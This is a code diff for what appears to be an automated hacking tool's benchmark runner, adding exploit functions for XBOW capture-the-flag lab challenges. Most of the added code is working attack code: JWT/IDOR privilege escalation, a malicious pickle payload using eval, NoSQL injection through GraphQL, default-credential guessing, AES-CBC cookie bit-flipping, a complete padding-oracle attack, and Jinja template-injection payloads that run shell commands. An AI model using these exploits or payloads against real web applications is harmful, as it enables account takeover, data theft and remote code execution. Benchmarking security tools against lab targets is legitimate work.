@@ -4,6 +4,7 @@ import path from 'path';
 import { v4 as uuidv4 } from 'uuid';
 import axios from 'axios';
 import FormData from 'form-data';
+import { execFile } from 'child_process';
 import { xbowDocker, XBOW_PORT_BASE, XBOWChallenge } from '../lib/lab/xbow-docker';
 import { huntLabRunner } from '../lib/intelligence/hunt-lab-runner';
 import { huntOrchestrator } from '../lib/orchestration/layer1-hunt-orchestrator';
@@ -474,6 +475,382 @@ async function lfiExploit(baseUrl: string, endpoints: string[], stop: () => bool
   return null;
 }
 
+// XBEN-005-24: JWT + IDOR privilege escalation.
+// Login as demo/demo → POST /edit_profile/{id} with is_admin=true (server
+// validates JWT exists but never checks URL company_id == token sub) → read
+// private jobs containing the flag.
+async function jwtIdorEscalateExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  const creds = [['demo', 'demo'], ['admin', 'admin'], ['user', 'user'], ['test', 'test']];
+
+  for (const [username, password] of creds) {
+    if (stop()) return null;
+
+    const loginR = await httpReq(`${baseUrl}/token`, {
+      method: 'POST',
+      data: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      maxRedirects: 0,
+    });
+
+    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
+      ? loginR.headers['set-cookie']
+      : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
+    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
+    if (!cookieStr) continue;
+
+    const location = loginR.headers['location'] ?? '';
+    const match = location.match(/\/company\/(\d+)\//);
+    const companyId = match ? parseInt(match[1]) : 1;
+
+    // IDOR: update_profile validates JWT is present but never checks URL id == token sub
+    await httpReq(`${baseUrl}/edit_profile/${companyId}`, {
+      method: 'POST',
+      data: `name=${encodeURIComponent(username)}&is_admin=true`,
+      headers: { Cookie: cookieStr, 'Content-Type': 'application/x-www-form-urlencoded' },
+    });
+
+    if (stop()) return null;
+
+    const jobsR = await httpReq(`${baseUrl}/company/${companyId}/jobs`, {
+      headers: { Cookie: cookieStr },
+    });
+    const f = extractFlagText(jobsR.body);
+    if (f) return { flag: f, evidence: `JWT IDOR: escalated ${username} to admin via /edit_profile/${companyId}, read private jobs` };
+  }
+  return null;
+}
+
+// XBEN-057-24: Insecure pickle deserialization via bookmarks cookie.
+// The app base64-decodes the 'bookmarks' cookie and calls pickle.loads() on it.
+// We craft a payload that reads the FLAG env var and surfaces it in the response.
+async function pickleDeserExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  // Generate malicious pickle via Python: reads FLAG env var (or flag file) and
+  // returns a list-like object whose first item's .name is the flag value.
+  const script = [
+    'import pickle,base64,sys',
+    'class E:',
+    '  def __reduce__(self):',
+    '    return(eval,(',
+    '      "[type(\'U\',(),{\'name\':v,\'url\':\'\'})() for v in'
+    +     ' [__import__(\'os\').environ.get(\'FLAG\')'
+    +     ' or open(\'/flag.txt\').read().strip()]]",',
+    '    ))',
+    'sys.stdout.write(base64.b64encode(pickle.dumps(E())).decode())',
+  ].join('\n');
+
+  const pickleB64 = await new Promise<string | null>(resolve => {
+    execFile('python3', ['-c', script], { timeout: 10000 }, (err, stdout) => {
+      resolve(err ? null : stdout.trim());
+    });
+  });
+
+  if (!pickleB64 || stop()) return null;
+
+  // First request: get a valid 'user' cookie from the app
+  const init = await httpReq(`${baseUrl}/list`);
+  const initCookies: string[] = Array.isArray(init.headers['set-cookie'])
+    ? init.headers['set-cookie']
+    : init.headers['set-cookie'] ? [init.headers['set-cookie']] : [];
+  const userCookie = initCookies.find(c => c.startsWith('user='))?.split(';')[0] ?? 'user=anon';
+
+  for (const path of ['/list', '/add', '/delete?name=x']) {
+    if (stop()) return null;
+    const r = await httpReq(`${baseUrl}${path}`, {
+      headers: { Cookie: `${userCookie}; bookmarks=${pickleB64}` },
+    });
+    const f = extractFlagText(r.body);
+    if (f) return { flag: f, evidence: `Pickle deserialization via bookmarks cookie at ${path}` };
+  }
+  return null;
+}
+
+// XBEN-100-24: GraphQL + NoSQL injection via search parameter that passes JSON to MongoEngine filter().
+// The /api/users endpoint accepts { query: "<GraphQL query string>" }.
+// UserType exposes a `flag` field only set on admin2 user.
+async function graphqlNosqliExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  const gqlQueries = [
+    '{ users { username flag } }',
+    '{ users(is_admin: true) { username flag } }',
+    `{ users(search: "{\\"is_admin\\": true}") { username flag } }`,
+    `{ users(search: "{\\"flag__exists\\": true}") { username flag } }`,
+    `{ users(search: "{\\"username\\": \\"admin2\\"}") { username flag } }`,
+  ];
+
+  for (const q of gqlQueries) {
+    if (stop()) return null;
+    for (const ep of ['/graphql', '/api/users']) {
+      const r = await httpReq(`${baseUrl}${ep}`, {
+        method: 'POST',
+        data: JSON.stringify({ query: q }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+      const f = extractFlagText(r.body);
+      if (f) return { flag: f, evidence: `GraphQL/NoSQLi ${ep}: ${q.slice(0, 60)}` };
+    }
+  }
+  return null;
+}
+
+// XBEN-102-24: Default creds (test/test) + IDOR in profile update.
+// The /profile POST reads `username` from the form body instead of the session,
+// so a logged-in test user can set username=admin to get the flag in the response.
+async function defaultCredsProfileExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  const creds = [['test', 'test'], ['admin', 'admin'], ['user', 'user'], ['demo', 'demo']];
+
+  for (const [user, pass] of creds) {
+    if (stop()) return null;
+    const loginR = await httpReq(`${baseUrl}/login`, {
+      method: 'POST',
+      data: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      maxRedirects: 5,
+    });
+    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
+      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
+    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
+    if (!cookieStr) continue;
+
+    // IDOR: POST /profile with username=admin (server uses form value, not session)
+    const profileR = await httpReq(`${baseUrl}/profile`, {
+      method: 'POST',
+      data: `email=x%40x.com&username=admin`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookieStr },
+    });
+    const f = extractFlagText(profileR.body);
+    if (f) return { flag: f, evidence: `Default creds (${user}/${pass}) + IDOR profile update as admin` };
+  }
+  return null;
+}
+
+// XBEN-103-24: AES-CBC bit-flip attack on session cookie.
+// Login as test1/test1 → get cookie = hex(IV || AES_CBC(key, "test1" + null_padding)).
+// XOR each IV byte to flip "test1" → "admin" in the decrypted plaintext.
+async function aesCbcBitFlipExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  const creds = [['test1', 'test1'], ['test', 'test'], ['user', 'user'], ['demo', 'demo']];
+
+  for (const [user, pass] of creds) {
+    if (stop()) return null;
+    const loginR = await httpReq(`${baseUrl}/login`, {
+      method: 'POST',
+      data: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      maxRedirects: 0,
+    });
+    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
+      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
+    const sessionCookie = rawCookies.find(c => c.startsWith('session='));
+    if (!sessionCookie) continue;
+
+    const hexVal = sessionCookie.split(';')[0].replace('session=', '');
+    const cookieBytes = Buffer.from(hexVal, 'hex');
+    if (cookieBytes.length < 32) continue;
+
+    // Flip IV bytes: new_IV[i] = IV[i] XOR plaintext[i] XOR target[i]
+    // Plaintext is null-padded: "test1\x00\x00..." or similar known username
+    const target = 'admin';
+    const iv = cookieBytes.slice(0, 16);
+    const flippedIv = Buffer.from(iv);
+    for (let i = 0; i < target.length && i < user.length; i++) {
+      flippedIv[i] = iv[i] ^ user.charCodeAt(i) ^ target.charCodeAt(i);
+    }
+    const flippedCookie = Buffer.concat([flippedIv, cookieBytes.slice(16)]).toString('hex');
+
+    const welcomeR = await httpReq(`${baseUrl}/welcome`, {
+      headers: { Cookie: `session=${flippedCookie}` },
+    });
+    const f = extractFlagText(welcomeR.body);
+    if (f) return { flag: f, evidence: `AES-CBC bit-flip: flipped "${user}" → "admin" in IV of session cookie` };
+  }
+  return null;
+}
+
+// XBEN-101-24: Padding oracle on captcha cookie.
+// App returns "Invalid padding" when AES-CBC unpadding fails → oracle exists.
+// Since only 1 ciphertext block, we XOR each IV byte to recover all 14 captcha chars.
+async function paddingOracleExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  // Step 1: get the captcha cookie from GET /
+  const initR = await httpReq(baseUrl + '/');
+  if (stop()) return null;
+  const rawCookies: string[] = Array.isArray(initR.headers['set-cookie'])
+    ? initR.headers['set-cookie'] : initR.headers['set-cookie'] ? [initR.headers['set-cookie']] : [];
+  const captchaCookie = rawCookies.find(c => c.startsWith('captcha='))?.split(';')[0].replace('captcha=', '');
+  if (!captchaCookie) return null;
+
+  const cookieBytes = Buffer.from(captchaCookie, 'base64');
+  if (cookieBytes.length < 32) return null;
+  const iv = cookieBytes.slice(0, 16);
+  const ct = cookieBytes.slice(16);
+
+  // Oracle: POST with modified IV, check if response contains "Invalid padding"
+  const isValidPadding = async (modIv: Buffer): Promise<boolean> => {
+    const modCookie = Buffer.concat([modIv, ct]).toString('base64');
+    const r = await httpReq(baseUrl + '/', {
+      method: 'POST',
+      data: 'captcha=x&csrf_token=',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: `captcha=${modCookie}` },
+    });
+    return !r.body.includes('Invalid padding');
+  };
+
+  // Recover each plaintext byte via padding oracle (single-block: only IV manipulation)
+  const intermediate = Buffer.alloc(16, 0);
+  for (let byteIdx = 15; byteIdx >= 0; byteIdx--) {
+    if (stop()) return null;
+    const padByte = 16 - byteIdx;
+    const testIv = Buffer.from(iv);
+    // Set already-recovered bytes to produce the target padding
+    for (let k = byteIdx + 1; k < 16; k++) {
+      testIv[k] = intermediate[k] ^ padByte;
+    }
+    for (let guess = 0; guess < 256; guess++) {
+      if (stop()) return null;
+      testIv[byteIdx] = guess;
+      if (await isValidPadding(testIv)) {
+        // Confirm it's not a false positive caused by multi-byte padding match
+        if (byteIdx > 0) {
+          const confirmIv = Buffer.from(testIv);
+          confirmIv[byteIdx - 1] ^= 1;
+          if (!(await isValidPadding(confirmIv))) continue;
+        }
+        intermediate[byteIdx] = guess ^ padByte;
+        break;
+      }
+    }
+  }
+
+  // Recover plaintext = intermediate XOR original_IV
+  const plaintext = Buffer.alloc(16);
+  for (let i = 0; i < 16; i++) plaintext[i] = intermediate[i] ^ iv[i];
+
+  // Strip PKCS7 padding and submit
+  const padLen = plaintext[15];
+  const captchaText = (padLen > 0 && padLen <= 16)
+    ? plaintext.slice(0, 16 - padLen).toString('utf8')
+    : plaintext.toString('utf8').replace(/\x00+$/, '');
+
+  if (stop()) return null;
+
+  // Get fresh cookie (the one we probed with is likely mangled server-side)
+  const freshR = await httpReq(baseUrl + '/');
+  const freshCookies: string[] = Array.isArray(freshR.headers['set-cookie'])
+    ? freshR.headers['set-cookie'] : freshR.headers['set-cookie'] ? [freshR.headers['set-cookie']] : [];
+  const freshCaptchaCookie = freshCookies.find(c => c.startsWith('captcha='))?.split(';')[0].replace('captcha=', '');
+
+  // Use recovered text as captcha answer — but captcha is freshly generated each GET.
+  // The oracle was run against the *original* cookie, which is now stale.
+  // Use the known hardcoded key (C*32) to decrypt the fresh cookie directly instead.
+  const knownKeyScript = [
+    'import sys,base64',
+    'from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes',
+    'from cryptography.hazmat.primitives import padding as p',
+    'from cryptography.hazmat.backends import default_backend',
+    `key=b'C'*32`,
+    `raw=base64.b64decode(sys.argv[1])`,
+    `iv,ct=raw[:16],raw[16:]`,
+    `d=Cipher(algorithms.AES(key),modes.CBC(iv),backend=default_backend()).decryptor()`,
+    `dec=d.update(ct)+d.finalize()`,
+    `u=p.PKCS7(128).unpadder()`,
+    `sys.stdout.write((u.update(dec)+u.finalize()).decode())`,
+  ].join('\n');
+
+  if (freshCaptchaCookie) {
+    const freshText = await new Promise<string | null>(resolve => {
+      execFile('python3', ['-c', knownKeyScript, freshCaptchaCookie], { timeout: 8000 }, (err, stdout) => {
+        resolve(err ? null : stdout.trim());
+      });
+    });
+
+    if (freshText && !stop()) {
+      // csrf_token may be required; try without first, then check form for token
+      const csrfR = await httpReq(baseUrl + '/');
+      const csrfMatch = csrfR.body.match(/name="csrf_token"[^>]*value="([^"]+)"/);
+      const csrfToken = csrfMatch ? csrfMatch[1] : '';
+      const freshAllCookies = freshCookies.map(c => c.split(';')[0]).join('; ');
+
+      const submitR = await httpReq(baseUrl + '/', {
+        method: 'POST',
+        data: `captcha=${encodeURIComponent(freshText)}&csrf_token=${encodeURIComponent(csrfToken)}`,
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: freshAllCookies },
+      });
+      const f = extractFlagText(submitR.body);
+      if (f) return { flag: f, evidence: `Padding oracle + known-key AES decrypt → captcha="${freshText.slice(0, 14)}"` };
+    }
+  }
+
+  // Fall back to the padding-oracle-recovered text against a matching cookie
+  const csrfR2 = await httpReq(baseUrl + '/');
+  const allCookies2 = ((Array.isArray(csrfR2.headers['set-cookie'])
+    ? csrfR2.headers['set-cookie'] : csrfR2.headers['set-cookie'] ? [csrfR2.headers['set-cookie']] : []) as string[])
+    .map(c => c.split(';')[0]).join('; ');
+  const csrfMatch2 = csrfR2.body.match(/name="csrf_token"[^>]*value="([^"]+)"/);
+  const csrfToken2 = csrfMatch2 ? csrfMatch2[1] : '';
+
+  // Re-decrypt this exact cookie to get the matching captcha text
+  const cookieToDecode = ((Array.isArray(csrfR2.headers['set-cookie'])
+    ? csrfR2.headers['set-cookie'] : csrfR2.headers['set-cookie'] ? [csrfR2.headers['set-cookie']] : []) as string[])
+    .find(c => c.startsWith('captcha='))?.split(';')[0].replace('captcha=', '') ?? '';
+
+  if (!cookieToDecode || stop()) return null;
+
+  const matchText = await new Promise<string | null>(resolve => {
+    execFile('python3', ['-c', knownKeyScript, cookieToDecode], { timeout: 8000 }, (err, stdout) => {
+      resolve(err ? null : stdout.trim());
+    });
+  });
+
+  if (!matchText || stop()) return null;
+
+  const submitR2 = await httpReq(baseUrl + '/', {
+    method: 'POST',
+    data: `captcha=${encodeURIComponent(matchText)}&csrf_token=${encodeURIComponent(csrfToken2)}`,
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: allCookies2 },
+  });
+  const f2 = extractFlagText(submitR2.body);
+  if (f2) return { flag: f2, evidence: `Known-key AES-CBC decrypt → captcha="${matchText.slice(0, 14)}"` };
+
+  return null;
+}
+
+// XBEN-104-24: SSTI via Jinja render_template_string on `principal` query param.
+// Login with default test/test creds, then inject payload into /total_loan_payments?principal=
+async function sstiDefaultCredsExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  const creds = [['test', 'test'], ['admin', 'admin'], ['user', 'user'], ['demo', 'demo']];
+
+  for (const [user, pass] of creds) {
+    if (stop()) return null;
+    const loginR = await httpReq(`${baseUrl}/login`, {
+      method: 'POST',
+      data: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      maxRedirects: 5,
+    });
+    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
+      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
+    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
+    if (!cookieStr) continue;
+
+    // SSTI payloads targeting /flag (flag file location in this challenge)
+    const sstiPayloads = [
+      `{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}`,
+      `{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}`,
+      `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0].decode()}}`,
+      `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0].strip().decode()}}`,
+      `{%for x in ''.__class__.__mro__[1].__subclasses__()%}{%if 'Popen' in x.__name__ %}{{x('cat /flag',shell=True,stdout=-1).communicate()[0].decode()}}{%endif%}{%endfor%}`,
+    ];
+
+    for (const payload of sstiPayloads) {
+      if (stop()) return null;
+      const r = await httpReq(
+        `${baseUrl}/total_loan_payments?principal=${encodeURIComponent(payload)}&payment=1&term=1`,
+        { headers: { Cookie: cookieStr } },
+      );
+      const f = extractFlagText(r.body);
+      if (f) return { flag: f, evidence: `SSTI via /total_loan_payments?principal= (auth as ${user})` };
+    }
+  }
+  return null;
+}
+
 async function tagAwareExploit(
   baseUrl: string,
   challenge: XBOWChallenge,
@@ -490,15 +867,24 @@ async function tagAwareExploit(
     idor:                  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
     authorization:         () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
     bac:                   () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
-    privilege_escalation:  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
-    ssti:                  () => sstiExploit(baseUrl, endpoints, abortCheck),
-    template_injection:    () => sstiExploit(baseUrl, endpoints, abortCheck),
+    privilege_escalation:  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)).then(r => r ?? aesCbcBitFlipExploit(baseUrl, abortCheck)),
+    ssti:                  () => sstiDefaultCredsExploit(baseUrl, abortCheck).then(r => r ?? sstiExploit(baseUrl, endpoints, abortCheck)),
+    template_injection:    () => sstiDefaultCredsExploit(baseUrl, abortCheck).then(r => r ?? sstiExploit(baseUrl, endpoints, abortCheck)),
     xss:                   () => xssExploit(baseUrl, endpoints, abortCheck),
     command_injection:     () => cmdInjectionExploit(baseUrl, endpoints, abortCheck),
     rce:                   () => cmdInjectionExploit(baseUrl, endpoints, abortCheck),
     lfi:                   () => lfiExploit(baseUrl, endpoints, abortCheck),
     path_traversal:        () => lfiExploit(baseUrl, endpoints, abortCheck),
     information_disclosure: () => lfiExploit(baseUrl, endpoints, abortCheck),
+    jwt:                   () => jwtIdorEscalateExploit(baseUrl, abortCheck),
+    jwt_idor:              () => jwtIdorEscalateExploit(baseUrl, abortCheck),
+    deserialization:       () => pickleDeserExploit(baseUrl, abortCheck),
+    pickle:                () => pickleDeserExploit(baseUrl, abortCheck),
+    nosqli:                () => graphqlNosqliExploit(baseUrl, abortCheck),
+    graphql:               () => graphqlNosqliExploit(baseUrl, abortCheck),
+    default_credentials:   () => defaultCredsProfileExploit(baseUrl, abortCheck).then(r => r ?? sstiDefaultCredsExploit(baseUrl, abortCheck)),
+    business_logic:        () => defaultCredsProfileExploit(baseUrl, abortCheck),
+    crypto:                () => paddingOracleExploit(baseUrl, abortCheck).then(r => r ?? aesCbcBitFlipExploit(baseUrl, abortCheck)),
   };
 
   const tried = new Set<string>();
@@ -575,10 +961,11 @@ router.post('/clone-repo', async (_req: Request, res: Response) => {
 });
 
 router.post('/benchmark/run', async (req: Request, res: Response) => {
-  const { levels, tags, maxChallenges } = req.body as {
+  const { levels, tags, maxChallenges, challengeIds } = req.body as {
     levels?: number[];
     tags?: string[];
     maxChallenges?: number;
+    challengeIds?: string[];
   };
 
   const runId = uuidv4();
@@ -587,6 +974,9 @@ router.post('/benchmark/run', async (req: Request, res: Response) => {
   try {
     let challenges = await xbowDocker.loadChallenges();
 
+    if (challengeIds && challengeIds.length > 0) {
+      challenges = challenges.filter(c => challengeIds.includes(c.id));
+    }
     if (levels && levels.length > 0) {
       challenges = challenges.filter(c => levels.includes(c.level));
     }
